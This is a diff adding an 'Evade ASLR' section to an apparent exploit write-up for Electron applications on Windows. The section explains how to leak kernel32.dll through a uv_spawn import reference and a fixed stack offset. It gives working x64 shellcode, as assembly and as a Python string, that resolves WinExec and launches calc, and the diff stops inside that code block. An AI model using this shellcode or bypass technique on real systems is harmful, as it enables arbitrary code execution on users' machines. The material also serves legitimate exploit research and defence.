@@ -245,3 +245,89 @@ console.log('shellcode_0 ' + ToHex(shellcode_0));
 heap_write64(target_rwx, shellcode_0);
 ```
 
+## Evade ASLR
+
+The last step is to evade ASLR , get kernel32.dll address and execute our code through winexec.
+Testing across multiple electron applications, setting a breakpoint as the first assembly instruction I found that there is a memory address at RSP+0x38 which is at a fixed offset from a reference to a kernel32.dll address.
+
+The electron application binary has many exported functions, one of them is called ``uv_spawn``.
+Exported functions address in memory can be found by getting the offset from the binary memory dump in windows or using nm –demangle in linux
+
+![image](https://github.com/user-attachments/assets/143f5310-8e18-428c-a750-ed988753d457)
+
+What we need here is the second column, that is offset of the function.
+In windbg the base address of the application can be obtained with !PEB command 
+![image](https://github.com/user-attachments/assets/4e5bfd8c-1991-4360-b4e9-8b417bfaffa7)
+
+Now we can inspect the code of any function by inspecting the address app_base + function offset, for example the function uv_spawn is located at 
+7ff6147f0000 + 0x229c1e0. The offsets differ depending on the application binary.
+Looking into the function uv_spawn, at offset 0x184 is the following assembly instruction.
+Inspecting uv_spawn + 0x184
+![image](https://github.com/user-attachments/assets/2cff9684-8875-4051-9c3d-f302a4cd2deb)
+
+Inspecting the call instruction address
+
+![image](https://github.com/user-attachments/assets/85ea9d3b-2760-42c6-bd1f-4a48726f511b)
+
+Inspecting the first address of the call instruction address
+
+![image](https://github.com/user-attachments/assets/9a5bf948-f4fe-4de6-b078-bfccc18c8493)
+
+As seen in the screenshots, the first address uv_spawn + 0x184 contains an assembly instruction which calls the address contained in 0x7FF61E6D00C0, the content of this address is the address of a kernel32 function, KERNEL32_MultiByteToWideCharStub
+There is a reference to an external module (kernel32.dll) from memory we can control
+uv_spawn + 0x184 = KERNEL32_MultiByteToWideCharStub
+This information is consistent across every electron application so it can be used to leak kernel32.dll and get access to winexec.
+
+As mentioned initially, when our shellcode is executed we can set a breakpoint as the first instruction and inspect the stack.
+
+Breakpoint hit first assembly instruction
+
+![image](https://github.com/user-attachments/assets/146c9bfe-c1a2-4ee2-b79e-45ca475ef6a3)
+
+At RSP + 0x38 there is an address at a fixed offset from the reference to kernel32.dll previously found.
+
+uv_spawn + 0x184 assembly instruction address –  address at RSP + 0x38 
+0x7FF61E6D00C0 – 0x7FF618950E8A = 0x5D7F236
+Connecting the kernel reference from uv_spawn and the fixed memory value in the stack at RSP + 0x38 we can craft reliable shellcode to access kernel32.dll -> winexec and run our exploit
+
+```assembly
+	mov r15, [rsp+0x38]
+	push 0x5D7F236
+	pop r14
+	add r15, r14
+        mov r13, [r15]   
+	push 0x57D70
+	pop r12
+        add r13, r12
+```
+First get the content of rsp + 0x38
+push the offset to KERNEL32_MultiByteToWideCharStub
+Add the offset and store the content of r15 (address of KERNEL32_MultiByteToWideCharStub ) in r13
+Push the offset of KERNEL32_WinExec and add it to r13
+r13 contains the address of KERNEL32_WinExec
+
+The rest of the shellcode is to push the arguments of winexec (calc and 1)
+```python
+sc = '''int3
+	mov r15, [rsp+0x38]
+	push 0x5D7F236
+	pop r14
+	add r15, r14
+        mov r13, [r15]   
+	push 0x57D70
+	pop r12
+        add r13, r12
+	push 0x0
+	pop rcx
+	push 0x636C6163
+	pop rdx
+	shl rcx, 0x20
+	add rcx, rdx
+	xor rdx, rdx
+	push rcx
+	mov rcx, rsp
+	inc rdx
+        call r13
+'''
+
+
